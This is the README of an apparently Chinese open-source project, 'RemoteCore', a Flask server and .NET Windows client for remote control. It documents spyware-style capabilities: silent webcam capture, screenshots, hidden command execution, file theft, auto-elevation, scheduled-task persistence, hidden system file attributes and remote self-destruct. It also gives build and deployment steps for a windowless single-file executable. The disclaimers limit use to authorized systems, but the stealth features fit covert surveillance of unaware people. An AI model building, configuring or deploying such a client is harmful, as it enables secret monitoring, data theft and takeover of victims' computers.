# RemoteCore (远程控制与管理系统)

**RemoteCore** 是一个功能强大的远程控制与管理系统，支持通过 Web 界面实现对 Windows 客户端的安全远程管理。本项目包含一个 Python Flask 服务器，以及 C# 语言实现的 Windows 客户端。

> **⚠️ 警告与免责声明**：本项目仅供学习、测试和合法授权的系统管理用途。未经明确许可，禁止在任何他人的设备上部署和使用此工具。使用者需对滥用此工具产生的一切后果自行承担责任。

---

## 目录

- [项目概览](#项目概览)
- [主要功能](#主要功能)
- [技术架构](#技术架构)
- [系统要求](#系统要求)
- [快速开始](#快速开始)
- [详细部署](#详细部署)
  - [服务端部署](#服务端部署)
  - [客户端部署](#客户端部署)
- [使用指南](#使用指南)
- [API文档](#api文档)
- [性能优化](#性能优化)
- [安全说明](#安全说明)
- [常见问题](#常见问题)
- [开发指南](#开发指南)
- [贡献者](#贡献者)
- [许可证](#许可证)

---

## 项目概览

RemoteCore 是一个采用 C/S 架构的远程控制系统，由以下组件组成：

- **服务端**：基于 Python Flask + Flask-SocketIO，提供 Web 控制面板和 API 服务
- **客户端**：基于 .NET 8.0 的 Windows 客户端，通过 Socket.IO 与服务器通信
- **Web 前端**：HTML/JavaScript 控制面板，提供直观的操作界面

### 核心特性

- 🔒 **安全认证**：多层 Token 认证机制，防止未授权访问
- ⚡ **高性能传输**：流式文件传输，支持大文件处理
- 🎨 **响应式 UI**：直观的 Web 控制面板
- 🔄 **实时通信**：基于 WebSocket 的双向通信
- 📦 **单文件部署**：客户端编译为独立可执行文件

---

## 主要功能

### 1. 远程摄像头控制 📷
- 后台静默调用默认摄像头
- 自动拍照并上传至服务器
- 支持 JPEG 格式压缩传输
- Web 端照片查看和下载

### 2. 远程屏幕抓取 🖥️
- 实时截取多显示器桌面
- 支持分辨率缩放（默认 1280×720）
- JPEG 图像质量可调（默认 35）
- 图片自动回传服务器

### 3. 远程桌面控制 (VNC) 🎮
- 基于 WebSocket 的实时屏幕传输
- 差异检测优化，仅传输变化画面
- 鼠标事件同步（移动、点击）
- 键盘事件同步
- 帧率最高可达 30 FPS

### 4. 远程命令执行 💻
- 支持任意 Windows CMD 命令
- 后台静默执行，无窗口显示
- 实时返回标准输出和错误输出
- 30秒超时保护
- 需要管理员权限运行

### 5. 远程文件管理 📁
- 浏览客户端任意目录
- 文件上传（客户端 → 服务器）
- 文件下载（服务器 → 客户端）
- 支持大文件传输（最高 5GB）
- 流式传输，内存占用低

### 6. 客户端控制 🛠️
- 远程重启客户端
- 远程停止客户端
- 远程卸载并自毁
- 进程互斥，防止多实例

### 7. 隐蔽运行机制 👻
- 自动隐藏控制台窗口
- 自动申请管理员权限
- 自动复制到 Program Files
- 任务计划程序实现开机自启
- 文件属性设为隐藏+系统

---

## 技术架构

### 系统架构图

```
┌─────────────────┐         WebSocket          ┌──────────────────┐
│  Web浏览器      │ ◄─────────────────────────► │  Flask 服务端    │
│  (控制面板)     │                            │  (Server.py)     │
└─────────────────┘                            └────────┬─────────┘
                                                        │
                                                        │ WebSocket
                                                        │
┌─────────────────┐         WebSocket          ┌─────────▼──────────┐
│  Windows客户端  │ ◄─────────────────────────► │  Socket.IO Server  │
│  (RemoteCore)   │                            │  (事件处理)        │
└─────────────────┘                            └────────────────────┘
```

### 技术栈

#### 服务端
- **Web框架**：Flask 3.0+
- **实时通信**：Flask-SocketIO 5.3+
- **文件处理**：Werkzeug 3.0+
- **HTTP客户端**：requests 2.31+
- **WebSocket支持**：simple-websocket 1.0+
- **开发语言**：Python 3.8+

#### 客户端
- **开发框架**：.NET 8.0
- **网络通信**：SocketIOClient 3.1.2
- **图像处理**：OpenCvSharp 4.9.0 + System.Drawing
- **系统调用**：P/Invoke Windows API
- **异步编程**：async/await
- **目标平台**：Windows x64

---

## 系统要求

### 服务端
| 组件 | 最低要求 | 推荐配置 |
|------|---------|---------|
| 操作系统 | Windows / Linux / macOS | Linux (Ubuntu 20.04+) |
| Python 版本 | 3.8 | 3.10+ |
| 内存 | 512MB | 2GB+ |
| 磁盘空间 | 100MB | 1GB+ |
| 网络端口 | 5000 | 5000（可配置） |

### 客户端
| 组件 | 最低要求 | 推荐配置 |
|------|---------|---------|
| 操作系统 | Windows 10 | Windows 10/11 |
| .NET 运行时 | .NET 8.0 | 自带（自包含发布） |
| 内存 | 256MB | 512MB+ |
| 磁盘空间 | 50MB | 100MB+ |
| 权限 | 标准用户 | 管理员（推荐） |

---

## 快速开始

### 服务端快速启动

```bash
# 1. 克隆仓库
git clone https://github.com/zycwer/RemoteCore.git
cd RemoteCore

# 2. 创建虚拟环境（推荐）
python -m venv .venv

# 3. 激活虚拟环境
# Windows:
.venv\Scripts\activate
# Linux/macOS:
source .venv/bin/activate

# 4. 安装依赖
pip install -r requirements.txt

# 5. 运行服务端
python server.py
```

服务默认运行在 `http://0.0.0.0:5000`，可通过浏览器访问。

### 客户端快速启动

1. 修改 `CSharpClient/RemoteClient.cs` 中的配置
2. 在 `CSharpClient` 目录下编译：
   ```bash
   dotnet publish -c Release -r win-x64
   ```
3. 运行生成的 `RemoteCore.exe`

---

## 详细部署

### 服务端部署

#### 1. 环境准备

确保系统已安装 Python 3.8+：

```bash
python --version
```

#### 2. 安装依赖

```bash
pip install -r requirements.txt
```

依赖项说明：

| 依赖包 | 用途 | 最低版本 |
|--------|------|---------|
| Flask | Web 框架 | 3.0.0 |
| Flask-SocketIO | WebSocket 支持 | 5.3.0 |
| Werkzeug | WSGI 工具库 | 3.0.0 |
| requests | HTTP 请求 | 2.31.0 |
| simple-websocket | WebSocket 传输 | 1.0.0 |

#### 3. 配置服务端

支持通过环境变量配置（推荐）：

| 环境变量 | 说明 | 默认值 |
|---------|------|--------|
| `AUTH_TOKEN` | 认证令牌 | `admin123` |
| `SECRET_KEY` | Flask 密钥 | 自动生成 |
| `HOST` | 监听地址 | `0.0.0.0` |
| `PORT` | 监听端口 | `5000` |

**Windows CMD 配置**：
```cmd
set AUTH_TOKEN=your_secure_token_here
set SECRET_KEY=your_flask_secret_key
```

**Windows PowerShell 配置**：
```powershell
$env:AUTH_TOKEN="your_secure_token_here"
$env:SECRET_KEY="your_flask_secret_key"
```

**Linux/macOS 配置**：
```bash
export AUTH_TOKEN="your_secure_token_here"
export SECRET_KEY="your_flask_secret_key"
```

#### 4. 启动服务端

```bash
python server.py
```

启动成功后会显示：
```
Server starting on 0.0.0.0:5000
Photos will be stored in: /path/to/RemoteCore/photos
```

#### 5. 使用 systemd 服务（Linux）

创建 `/etc/systemd/system/remotecore.service`：

```ini
[Unit]
Description=RemoteCore Server
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/path/to/RemoteCore
Environment="AUTH_TOKEN=your_secure_token"
ExecStart=/path/to/venv/bin/python server.py
Restart=on-failure
RestartSec=10

[Install]
WantedBy=multi-user.target
```

启用并启动服务：

```bash
sudo systemctl daemon-reload
sudo systemctl enable remotecore
sudo systemctl start remotecore
sudo systemctl status remotecore
```

### 客户端部署

#### 1. 配置客户端

编辑 `CSharpClient/RemoteClient.cs`：

```csharp
// 服务器地址
private readonly string _serverUrl = Environment.GetEnvironmentVariable("REMOTECORE_SERVER_URL") 
                                     ?? "http://你的服务器IP:5000";

// 认证令牌
private readonly string _authToken = Environment.GetEnvironmentVariable("REMOTECORE_AUTH_TOKEN") 
                                     ?? "与服务器一致的token";
```

也可以通过环境变量配置（推荐）：

| 环境变量 | 说明 | 默认值 |
|---------|------|--------|
| `REMOTECORE_SERVER_URL` | 服务器地址 | `http://127.0.0.1:5000` |
| `REMOTECORE_AUTH_TOKEN` | 认证令牌 | `admin123` |

#### 2. 编译客户端

**环境要求**：.NET 8.0 SDK

```bash
cd CSharpClient

# Debug 版本（带控制台输出）
dotnet build -c Debug

# Release 版本（无控制台窗口）
dotnet build -c Release
```

#### 3. 发布单文件可执行程序

```bash
# 自包含发布（无需安装 .NET 运行时）
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:OutputType=WinExe

# 依赖框架发布（需要安装 .NET 8.0 运行时）
dotnet publish -c Release -r win-x64 --self-contained false -p:PublishSingleFile=true -p:OutputType=WinExe
```

**发布参数说明**：

| 参数 | 说明 |
|------|------|
| `-c Release` | Release 配置 |
| `-r win-x64` | Windows x64 运行时 |
| `--self-contained true` | 自包含运行时 |
| `-p:PublishSingleFile=true` | 单文件发布 |
| `-p:OutputType=WinExe` | 无控制台窗口 |

发布的文件位于：
- `bin/Release/net8.0-windows/win-x64/publish/RemoteCore.exe`

#### 4. 运行客户端

直接双击 `RemoteCore.exe` 运行，或者：

```bash
.\RemoteCore.exe
```

运行后会：
1. 检查是否为管理员权限
2. 如果不是，弹出 UAC 提权
3. 复制到 `C:\Program Files\RemoteCore\`
4. 设置开机自启
5. 连接服务器

---

## 使用指南

### Web 控制台使用

#### 1. 登录

访问 `http://你的服务器IP:5000`，使用任意用户名和 `AUTH_TOKEN` 作为密码登录。

#### 2. 控制面板功能

| 功能 | 说明 |
|------|------|
| 拍照 | 触发客户端摄像头拍照 |
| 截图 | 触发客户端桌面截图 |
| 启动 VNC | 进入远程桌面控制模式 |
| 执行命令 | 在客户端执行 CMD 命令 |
| 浏览目录 | 查看客户端文件系统 |
| 上传文件 | 向客户端发送文件 |
| 下载文件 | 从客户端获取文件 |
| 客户端控制 | 重启/停止/卸载客户端 |

### 客户端操作说明

#### 1. 命令执行

支持所有 Windows CMD 命令，如：

```cmd
# 查看系统信息
systeminfo

# 查看当前用户
whoami

# 查看 IP 配置
ipconfig /all

# 列出进程
tasklist

# 网络测试
ping 8.8.8.8
```

#### 2. 文件管理

支持绝对路径和相对路径，如：

```
C:\Windows\System32
D:\Data
```

#### 3. VNC 控制

- 移动鼠标：移动鼠标指针
- 左键单击：鼠标左键点击
- 右键单击：鼠标右键点击
- 键盘输入：键盘按键同步

---

## API 文档

### 认证说明

所有 API 请求均需要认证，支持三种方式：

#### 1. Bearer Token（推荐）

```http
Authorization: Bearer <AUTH_TOKEN>
```

#### 2. Basic Auth

```http
Authorization: Basic <base64(username:password)>
```

其中密码为 `AUTH_TOKEN`，用户名为任意值。

#### 3. URL 参数

```http
?token=<AUTH_TOKEN>
```

---

### HTTP API

#### 1. 上传照片

**接口**：`POST /upload`

**请求**：
- Content-Type: `multipart/form-data`
- Body: `photo` 字段，文件内容

**响应**：
```json
{
  "success": true,
  "filename": "20240430_120000_abc123.jpg"
}
```

#### 2. 获取照片列表

**接口**：`GET /photos`

**响应**：
```json
[
  {
    "filename": "20240430_120000_abc123.jpg",
    "size": 123456,
    "timestamp": 1714470000
  }
]
```

#### 3. 下载照片

**接口**：`GET /photos/<filename>`

**响应**：JPEG 图片文件

#### 4. 触发拍照

**接口**：`POST /shoot`

**请求 Body**：
```json
{
  "client_id": "all"  // 或特定的 client_id
}
```

**响应**：
```json
{
  "success": true,
  "message": "Shoot command sent to all clients"
}
```

#### 5. 获取客户端列表

**接口**：`GET /clients`

**响应**：
```json
[
  "client_sid_1",
  "client_sid_2"
]
```

#### 6. 上传文件至服务器

**接口**：`POST /upload_to_client`

**请求**：
- Content-Type: `multipart/form-data`
- Body 字段：
  - `file`: 要上传的文件
  - `client_id`: 目标客户端 ID
  - `target_dir`: 客户端目标目录

**响应**：
```json
{
  "success": true,
  "message": "File uploaded to server, notifying client"
}
```

#### 7. 客户端上传文件

**接口**：`POST /client_upload_file`

**请求**：
- Content-Type: `multipart/form-data`
- Body 字段：
  - `file`: 文件内容
  - `filename`: 原始文件名

**响应**：
```json
{
  "success": true
}
```

#### 8. 下载文件

**接口**：`GET /download_from_server/<folder>/<filename>`

**参数**：
- `folder`: `uploads` 或 `downloads`
- `filename`: 文件名

**响应**：文件下载流

---

### Socket.IO 事件

#### 服务端 → 客户端

| 事件名 | 参数 | 说明 |
|--------|------|------|
| `shoot` | 无 | 触发拍照 |
| `take_screenshot` | 无 | 触发截图 |
| `execute_command` | `{command: "命令"}` | 执行命令 |
| `list_dir` | `{path: "目录"}` | 列出目录 |
| `start_vnc` | 无 | 启动 VNC |
| `stop_vnc` | 无 | 停止 VNC |
| `vnc_mouse_event` | 鼠标事件数据 | VNC 鼠标事件 |
| `vnc_key_event` | 键盘事件数据 | VNC 键盘事件 |
| `upload_file_to_server` | 文件信息 | 上传文件 |
| `download_file` | 文件下载信息 | 下载文件 |
| `client_control` | `{action: "操作"}` | 客户端控制 |

#### 客户端 → 服务端

| 事件名 | 参数 | 说明 |
|--------|------|------|
| `command_result` | `{command, output, error}` | 命令执行结果 |
| `dir_list_result` | `{path, files, error}` | 目录列表结果 |
| `client_upload_error` | `{error}` | 上传错误 |
| `client_download_complete` | `{success, path}` | 下载完成 |
| `vnc_frame` | `{image: base64}` | VNC 画面帧 |

---

## 性能优化

### VNC 性能优化

#### 1. 差异检测

- 采样步长：动态调整（`Math.Max(4, width / 50)`）
- 差异阈值：30（RGB 差值总和）
- 检测范围：达到 `DiffDetectionThreshold` (5000) 即停止

#### 2. 帧率控制

- 目标帧率：15 FPS
- 最小帧间隔：30ms
- 无变化时：自动减速

#### 3. 图像优化

- 分辨率：1280×720
- JPEG 质量：35
- 流式传输，内存占用低

### 文件传输优化

#### 1. 传输配置

| 配置项 | 值 | 说明 |
|-------|-----|------|
| 下载缓冲区 | 80KB | `DownloadBufferSize` |
| 上传缓冲区 | 80KB | `UploadBufferSize` |
| 文件超时 | 30分钟 | `FileTransferTimeoutMinutes` |
| 最大文件大小 | 5GB | 服务端配置 |

#### 2. 传输特性

- 流式 I/O，不占用过多内存
- 支持大文件传输
- 使用 `Accept-Encoding: gzip, deflate` 压缩
- HttpClient 配置优化

### 网络优化

- 使用持久连接
- WebSocket 心跳机制
- 自动重连策略
- 错误重试机制

---

## 安全说明

### 认证安全

- ✅ Token 验证保护所有接口
- ✅ 支持多种认证方式
- ⚠️ 默认 Token `admin123` 仅用于测试
- ⚠️ 生产环境必须使用强 Token

### 数据传输

- ⚠️ 当前未使用 TLS/HTTPS
- ⚠️ 生产环境建议使用 HTTPS + WSS
- ⚠️ 建议在受信任网络环境中使用

### 文件安全

- ✅ 路径遍历防护（使用 Werkzeug `secure_filename`）
- ✅ 上传目录隔离
- ✅ 限制文件数量和大小（防止 DoS）

### 客户端安全

- ⚠️ 需要管理员权限（功能最大化）
- ✅ 使用 UAC 提权
- ✅ 安装到 Program Files（系统保护）
- ✅ 隐藏文件属性

### 安全建议

1. **生产环境**：
   - 使用 HTTPS 和 WSS
   - 使用强认证 Token
   - 限制访问 IP
   - 定期轮换 Token

2. **客户端部署**：
   - 仅在授权设备上安装
   - 遵守相关法律法规
   - 明确告知用户

3. **日志记录**：
   - 监控服务器访问日志
   - 记录客户端连接信息
   - 检测异常行为

---

## 常见问题

### 1. 客户端无法连接服务器

**可能原因**：
- 服务器地址配置错误
- 防火墙阻止 5000 端口
- 认证 Token 不匹配
- 网络不通

**解决方案**：
```cmd
# 检查网络连通性
ping <服务器IP>

# 检查端口开放（使用 PowerShell）
Test-NetConnection -ComputerName <服务器IP> -Port 5000

# 确认 Token 一致
```

### 2. 摄像头拍照失败

**可能原因**：
- 没有摄像头
- 摄像头被占用
- 缺少访问权限
- 驱动问题

**解决方案**：
- 检查设备管理器
- 检查隐私设置
- 尝试其他应用调用摄像头

### 3. 远程命令执行失败

**可能原因**：
- 不是管理员权限
- 命令语法错误
- 超时（30秒）
- 被安全软件阻止

**解决方案**：
- 确认以管理员身份运行
- 检查命令语法
- 尝试拆分耗时命令

### 4. 文件上传/下载失败

**可能原因**：
- 文件太大
- 磁盘空间不足
- 权限不足
- 网络中断

**解决方案**：
- 检查目标目录权限
- 确保足够磁盘空间
- 使用较小文件测试
- 检查网络稳定性

### 5. VNC 画面卡顿

**可能原因**：
- 网络带宽不足
- 客户端性能问题
- 画面变化频繁

**解决方案**：
- 降低 JPEG 质量（在代码中调整 `VncQuality`）
- 降低目标分辨率（调整 `VncResolution`）
- 优化网络环境

### 6. 如何卸载客户端

**步骤**：
1. 使用 Web 控制台发送"卸载"指令
2. 或者手动删除：
   ```cmd
   # 删除文件
   rmdir /s /q "C:\Program Files\RemoteCore"
   
   # 删除计划任务
   schtasks /delete /tn "RemoteCore_AutoStart" /f
   ```

---

## 开发指南

### 项目结构

```
RemoteCore/
├── CSharpClient/              # C# 客户端项目
│   ├── Program.cs            # 主程序入口（权限管理）
│   ├── RemoteClient.cs       # 核心客户端逻辑
│   ├── RemoteCore.csproj     # 项目文件
│   ├── bin/                  # 编译输出
│   └── obj/                  # 临时文件
├── server.py                 # Python 服务端
├── index.html                # Web 前端
├── requirements.txt          # Python 依赖
├── photos/                   # 照片存储（运行时创建）
├── uploads/                  # 上传文件（运行时创建）
├── downloads/                # 下载文件（运行时创建）
├── .gitignore
├── README.md
└── LICENSE
```

### 本地开发

#### 1. 服务端开发

```bash
cd RemoteCore

# 创建虚拟环境
python -m venv .venv
.venv\Scripts\activate  # Windows
# source .venv/bin/activate  # Linux/macOS

# 安装依赖
pip install -r requirements.txt

# 开发模式运行（调试输出）
python server.py
```

#### 2. 客户端开发

```bash
cd RemoteCore/CSharpClient

# 安装 .NET 8.0 SDK
# 从 https://dotnet.microsoft.com/download 下载

# Debug 编译
dotnet build -c Debug

# Debug 运行（带控制台输出）
dotnet run -c Debug
```

#### 3. Web 前端开发

直接用浏览器打开 `index.html`（需要服务端运行）。

### 代码规范

#### C# 代码规范

- 使用 C# 12.0 语言特性
- 异步方法使用 `Async` 后缀
- 使用 `var` 进行类型推断
- 启用可空引用类型（`<Nullable>enable</Nullable>`）
- 遵循 Microsoft 命名规范

#### Python 代码规范

- 遵循 PEP 8 规范
- 使用 4 空格缩进
- 使用类型提示（Type Hints）

### 调试技巧

#### 1. 客户端调试

修改 `RemoteCore.csproj`：

```xml
<OutputType>Exe</OutputType>  <!-- 显示控制台窗口 -->
```

然后运行：

```bash
dotnet run -c Debug
```

#### 2. 服务端调试

启用 Flask 调试模式（**仅开发环境**）：

```python
if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
```

#### 3. 浏览器调试

- F12 打开开发者工具
- Console 查看 JS 错误
- Network 查看请求/响应

---

## 贡献者

感谢所有为 RemoteCore 做出贡献的开发者！

### 如何贡献

1. Fork 本仓库
2. 创建特性分支 (`git checkout -b feature/AmazingFeature`)
3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
4. 推送到分支 (`git push origin feature/AmazingFeature`)
5. 开启 Pull Request

### 开发建议

- 提交前确保代码可编译
- 更新相关文档
- 保持代码风格一致
- 写清晰的 Commit Message

---

## 许可证

本项目采用 MIT 许可证 - 详见 [LICENSE](LICENSE) 文件。

### MIT 许可证摘要

- ✅ 允许商业使用
- ✅ 允许修改
- ✅ 允许分发
- ✅ 允许私用
- ⚠️ 包含许可和版权声明
- ⚠️ 作者不提供担保

---

## 联系方式

- GitHub: [zycwer](https://github.com/zycwer)
- Issues: [GitHub Issues](https://github.com/zycwer/RemoteCore/issues)

---

## 免责声明

本工具仅供学习、研究和合法系统管理用途。**使用者必须**：

1. 遵守所有适用的法律法规
2. 仅在获得授权的设备上使用
3. 尊重他人隐私和权利
4. 对自身使用行为承担全部责任

作者不对任何滥用或误用行为负责。使用此工具的风险由使用者自行承担。
